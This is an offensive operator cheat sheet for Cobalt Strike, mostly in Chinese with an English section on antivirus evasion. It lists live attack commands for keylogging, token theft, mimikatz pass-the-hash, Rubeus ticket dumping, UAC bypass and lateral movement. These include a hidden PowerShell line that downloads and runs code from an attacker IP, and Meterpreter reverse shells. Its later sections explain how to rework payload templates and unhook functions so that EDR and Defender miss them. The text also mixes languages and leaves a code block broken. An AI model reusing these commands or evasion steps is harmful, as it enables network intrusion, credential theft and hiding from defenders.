# Cobalt Strike

{{#include /banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` 然后您可以选择监听的位置、使用的信标类型（http、dns、smb...）等。

### Peer2Peer Listeners

这些监听器的信标不需要直接与C2通信，它们可以通过其他信标与其通信。

`Cobalt Strike -> Listeners -> Add/Edit` 然后您需要选择TCP或SMB信标

* **TCP信标将在所选端口设置监听器**。要连接到TCP信标，请使用命令 `connect <ip> <port>` 从另一个信标
* **smb信标将在选定名称的管道中监听**。要连接到SMB信标，您需要使用命令 `link [target] [pipe]`。

### 生成和托管有效负载

#### 在文件中生成有效负载

`Attacks -> Packages ->`

* **`HTMLApplication`** 用于HTA文件
* **`MS Office Macro`** 用于带有宏的办公文档
* **`Windows Executable`** 用于.exe、.dll或服务.exe
* **`Windows Executable (S)`** 用于**无状态**的.exe、.dll或服务.exe（无状态比有状态更好，IoCs更少）

#### 生成和托管有效负载

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 这将生成一个脚本/可执行文件，以从cobalt strike下载信标，格式包括：bitsadmin、exe、powershell和python

#### 托管有效负载

如果您已经有要在Web服务器上托管的文件，只需转到 `Attacks -> Web Drive-by -> Host File` 并选择要托管的文件和Web服务器配置。

### 信标选项

<pre class="language-bash"><code class="lang-bash"># 执行本地 .NET 二进制文件
execute-assembly </path/to/executable.exe>
# 请注意，要加载大于 1MB 的程序集，需要修改可变配置文件的 'tasks_max_size' 属性。

# 截图
printscreen    # 通过 PrintScr 方法拍摄单个截图
screenshot     # 拍摄单个截图
screenwatch    # 定期拍摄桌面截图
## 转到视图 -> 截图以查看它们

# 键盘记录器
keylogger [pid] [x86|x64]
## 视图 > 按键记录以查看按下的键

# 端口扫描
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 在另一个进程中注入端口扫描操作
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## 导入 Powershell 模块
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <在此处编写powershell命令> # 这使用最高支持的powershell版本（不是oppsec）
powerpick <cmdlet> <args> # 这会创建一个由spawnto指定的牺牲进程，并将UnmanagedPowerShell注入其中以获得更好的opsec（不记录）
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # 这会将UnmanagedPowerShell注入指定进程以运行PowerShell cmdlet。

# 用户冒充
## 使用凭据生成令牌
make_token [DOMAIN\user] [password] # 创建令牌以在网络中冒充用户
ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
rev2self # 停止使用make_token生成的令牌
## 使用make_token会生成事件4624：帐户成功登录。此事件在Windows域中非常常见，但可以通过过滤登录类型来缩小范围。如上所述，它使用LOGON32_LOGON_NEW_CREDENTIALS，即类型9。

# UAC 绕过
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## 从pid窃取令牌
## 类似于make_token，但从进程中窃取令牌
steal_token [pid] # 此外，这对于网络操作而非本地操作很有用
## 从API文档中我们知道，这种登录类型“允许调用者克隆其当前令牌”。这就是信标输出显示冒充<current_username>的原因——它正在冒充我们自己的克隆令牌。
ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
rev2self # 停止使用steal_token中的令牌

## 使用新凭据启动进程
spawnas [domain\username] [password] [listener] # 从具有读取访问权限的目录执行，例如：cd C:\
## 类似于make_token，这将生成Windows事件4624：帐户成功登录，但登录类型为2（LOGON32_LOGON_INTERACTIVE）。它将详细说明调用用户（TargetUserName）和冒充用户（TargetOutboundUserName）。

## 注入进程
inject [pid] [x64|x86] [listener]
## 从OpSec的角度来看：除非真的有必要，否则不要执行跨平台注入（例如x86 -> x64或x64 -> x86）。

## 传递哈希
## 此修改过程需要修补LSASS内存，这是一个高风险操作，需要本地管理员权限，并且如果启用了受保护进程轻量级（PPL），则不太可行。
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## 通过mimikatz传递哈希
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## 如果没有/run，mimikatz会生成一个cmd.exe，如果您以具有桌面的用户身份运行，他将看到shell（如果您以SYSTEM身份运行，则可以继续）
steal_token <pid> # 从mimikatz创建的进程中窃取令牌

## 传递票证
## 请求票证
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## 创建一个新的登录会话以与新票证一起使用（以免覆盖被破坏的票证）
make_token <domain>\<username> DummyPass
## 从powershell会话中将票证写入攻击者机器并加载
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## 从SYSTEM传递票证
## 使用票证生成新进程
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## 从该进程中窃取令牌
steal_token <pid>

## 提取票证 + 传递票证
### 列出票证
execute-assembly C:\path\Rubeus.exe triage
### 通过luid转储有趣的票证
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### 创建新的登录会话，注意luid和processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 在生成的登录会话中插入票证
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 最后，从新进程中窃取令牌
steal_token <pid>

# 横向移动
## 如果创建了令牌，将会使用它
jump [method] [target] [listener]
## 方法：
## psexec                    x86   使用服务运行服务EXE工件
## psexec64                  x64   使用服务运行服务EXE工件
## psexec_psh                x86   使用服务运行PowerShell单行命令
## winrm                     x86   通过WinRM运行PowerShell脚本
## winrm64                   x64   通过WinRM运行PowerShell脚本
## wmi_msbuild               x64   使用msbuild内联C#任务的wmi横向移动（oppsec）

remote-exec [method] [target] [command] # remote-exec不返回输出
## 方法：
## psexec                          通过服务控制管理器远程执行
## winrm                           通过WinRM（PowerShell）远程执行
## wmi                             通过WMI远程执行

## 要使用wmi执行信标（它不在jump命令中），只需上传信标并执行
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

# 将会话传递给Metasploit - 通过监听器
## 在metaploit主机上
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## 在cobalt上：Listeners > Add并将Payload设置为Foreign HTTP。将Host设置为10.10.5.120，将Port设置为8080，然后单击保存。
beacon> spawn metasploit
## 您只能使用外部监听器生成x86 Meterpreter会话。

# 将会话传递给Metasploit - 通过shellcode注入
## 在metasploit主机上
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## 运行msfvenom并准备multi/handler监听器

## 将bin文件复制到cobalt strike主机
ps
shinject <pid> x64 C:\Payloads\msf.bin # 在x64进程中注入metasploit shellcode

# 将metasploit会话传递给cobalt strike
## 生成无状态信标shellcode，转到Attacks > Packages > Windows Executable (S)，选择所需的监听器，选择Raw作为输出类型并选择使用x64有效负载。
## 在metasploit中使用post/windows/manage/shellcode_inject注入生成的cobalt strike shellcode

# 透传
## 在teamserver中打开socks代理
beacon> socks 1080

# SSH连接
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### 执行程序集

**`execute-assembly`** 使用**牺牲进程**通过远程进程注入来执行指定的程序。这是非常嘈杂的，因为要在进程内部注入，使用了每个EDR都在检查的某些Win API。然而，有一些自定义工具可以用来在同一进程中加载某些内容：

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- 在Cobalt Strike中，您还可以使用BOF（信标对象文件）：[https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

agressor脚本 `https://github.com/outflanknl/HelpColor` 将在Cobalt Strike中创建 `helpx` 命令，该命令将在命令中添加颜色，指示它们是否为BOFs（绿色）、是否为Frok&Run（黄色）及类似情况，或者是否为ProcessExecution、注入或类似情况（红色）。这有助于了解哪些命令更隐蔽。

### 作为用户操作

您可以检查事件，如 `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`：

- 安全EID 4624 - 检查所有交互式登录以了解通常的操作时间。
- 系统EID 12,13 - 检查关机/启动/睡眠频率。
- 安全EID 4624/4625 - 检查有效/无效的NTLM尝试。
- 安全EID 4648 - 当使用明文凭据登录时，会生成此事件。如果某个进程生成了它，则该二进制文件可能在配置文件或代码中以明文形式包含凭据。

在使用Cobalt Strike的 `jump` 时，最好使用 `wmi_msbuild` 方法，使新进程看起来更合法。

### 使用计算机帐户

防御者通常会检查用户生成的奇怪行为，并**将服务帐户和计算机帐户如 `*$` 排除在监控之外**。您可以使用这些帐户进行横向移动或权限提升。

### 使用无状态有效负载

无状态有效负载比有状态有效负载噪音更小，因为它们不需要从C2服务器下载第二阶段。这意味着在初始连接后不会生成任何网络流量，从而降低被基于网络的防御检测到的可能性。

### 令牌和令牌存储

在窃取或生成令牌时要小心，因为EDR可能会枚举所有线程的所有令牌并找到**属于不同用户**甚至SYSTEM的令牌。

这允许按**信标**存储令牌，因此不需要一次又一次地窃取相同的令牌。这对于横向移动或当您需要多次使用窃取的令牌时非常有用：

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

在横向移动时，通常**窃取令牌比生成新令牌更好**或执行传递哈希攻击。

### 防护措施

Cobalt Strike有一个名为**Guardrails**的功能，帮助防止使用某些可能被防御者检测到的命令或操作。Guardrails可以配置为阻止特定命令，例如 `make_token`、`jump`、`remote-exec` 和其他常用于横向移动或权限提升的命令。

此外，repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) 还包含一些检查和建议，您可以在执行有效负载之前考虑。

### 票证加密

在AD中要小心票证的加密。默认情况下，一些工具将使用RC4加密Kerberos票证，这比AES加密安全性低，默认情况下，最新环境将使用AES。这可能会被监控弱加密算法的防御者检测到。

### 避免默认设置

使用Cobalt Strike时，默认情况下，SMB管道将命名为 `msagent_####` 和 `"status_####`。更改这些名称。可以使用命令 `ls \\.\pipe\` 检查Cobalt Strike中现有管道的名称。

此外，使用SSH会话时，会创建一个名为 `\\.\pipe\postex_ssh_####` 的管道。使用 `set ssh_pipename "<new_name>";` 更改它。

在后期利用攻击中，管道 `\\.\pipe\postex_####` 可以使用 `set pipename "<new_name>"` 进行修改。

在Cobalt Strike配置文件中，您还可以修改以下内容：

- 避免使用 `rwx`
- 进程注入行为的工作方式（将使用哪些API）在 `process-inject {...}` 块中
- “fork and run” 在 `post-ex {…}` 块中的工作方式
- 睡眠时间
- 要加载到内存中的二进制文件的最大大小
- 内存占用和DLL内容与 `stage {...}` 块
- 网络流量

### 绕过内存扫描

一些ERDs扫描内存以查找已知恶意软件签名。Cobalt Strike允许修改 `sleep_mask` 函数作为BOF，这将能够在内存中加密后门。

### 嘈杂的进程注入

在进程中注入代码通常是非常嘈杂的，这是因为**没有常规进程通常执行此操作，并且执行此操作的方式非常有限**。因此，它可能会被基于行为的检测系统检测到。此外，它还可能被EDR检测到，后者扫描网络以查找**包含不在磁盘上的代码的线程**（尽管诸如使用JIT的浏览器等进程通常会这样做）。示例：[https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID和PPID关系

在生成新进程时，重要的是**保持进程之间的常规父子关系**以避免检测。如果svchost.exec正在执行iexplorer.exe，这看起来会很可疑，因为svchost.exe在正常的Windows环境中不是iexplorer.exe的父进程。

当在Cobalt Strike中生成新的信标时，默认情况下会创建一个使用**`rundll32.exe`**的进程来运行新的监听器。这不是很隐蔽，容易被EDR检测到。此外，`rundll32.exe`在没有任何参数的情况下运行，使其更加可疑。

使用以下Cobalt Strike命令，您可以指定一个不同的进程来生成新的信标，从而使其更不易被检测到：
```bash
spawnto x86 svchost.exe
```
您还可以在配置文件中更改此设置 **`spawnto_x86` 和 `spawnto_x64`**。

### 代理攻击者流量

攻击者有时需要能够在本地运行工具，即使在 Linux 机器上，并使受害者的流量到达该工具（例如 NTLM 中继）。

此外，有时进行 pass-the-hash 或 pass-the-ticket 攻击时，攻击者在本地 **将此哈希或票证添加到自己的 LSASS 进程中** 会更隐蔽，然后从中进行横向移动，而不是修改受害者机器的 LSASS 进程。

然而，您需要 **小心生成的流量**，因为您可能会从后门进程发送不常见的流量（kerberos？）。为此，您可以切换到浏览器进程（尽管您可能会因注入到进程中而被抓住，因此请考虑一种隐蔽的方式来做到这一点）。
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> 更改密码  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# 更改 powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# 更改 $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


{{#include /banners/hacktricks-training.md}}
